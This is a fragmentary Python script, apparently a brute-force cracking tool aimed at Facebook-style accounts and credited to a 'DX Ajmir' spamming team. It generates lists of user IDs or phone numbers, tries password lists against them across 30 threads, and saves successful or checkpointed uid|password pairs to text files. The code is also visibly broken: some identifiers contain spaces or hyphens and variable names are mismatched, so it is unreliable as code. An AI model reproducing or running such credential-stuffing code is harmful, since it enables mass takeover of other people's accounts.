...
os.system('xdg-open https://chat.whatsapp.com/+8801813225678')
...
╚═╝░░╚═╝╚═╝░░╚═╝░░░░░░░░░░░╚═╝░╚════╝░\033[1;97DX-Ajmir                                        
----------------------------------------------
AUTHER    :  DX AJMIR HOSSAIN
TEAM        :  S.D.S SPMMING TEAM
BROTHER  :  SHAFI,SHOURVO
...
def Main_DX Ajmir():
        ...
        if shm =='1':
            ...
            os.system(f'xdg-open https://chat.whatsapp.com/t.me/+8801813225678')
            Main_DX Ajmir()
        elif shm =='5':
...
def file_crack():
    ...
    with tred(max_workers=30) as ZIDI:
        ...
        for user in fo:
            ...
            passlist = plist
            if methd =='1':
                DX Ajmir.submit(api1,ids,names,passlist)
            else:
                DX Ajmir.submit(api1,ids,names,passlist)
    print('\033[1;37m')
    linex()
...
def pak():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with tred(max_workers=30) as DX-Ajmir:
        clear()
        tl = str(len(user))
        print(' [+] Total accounts : '+tl)
...
def rd1(ids,passlist):
    try:
        ...
        sys.stdout.write('\r [DX-Ajmir]  %s|  OK:-%s '%(loop,len(oks)));sys.stdout.flush()
        for pas in passlist:
                ...
                if 'session_key' in po:
                        ...
                        print('\r\r\033[1;32m [DX-Ajmir-OK] '+uid+' | '+pas)
                        ...
                        #print(f'\r\r\33[1m\33[1;35m [DX-Ajmir-CP] '+uid+' | '+pas+'\033[1;97m')
    ...
    try:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r\r\33[1m\33[1;35m [DX-Ajmir-CP] '+uid+' | '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, 'DX-Ajmir-CP.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+'|'+pas+'\n')
                    cps.append(uid)
                    break
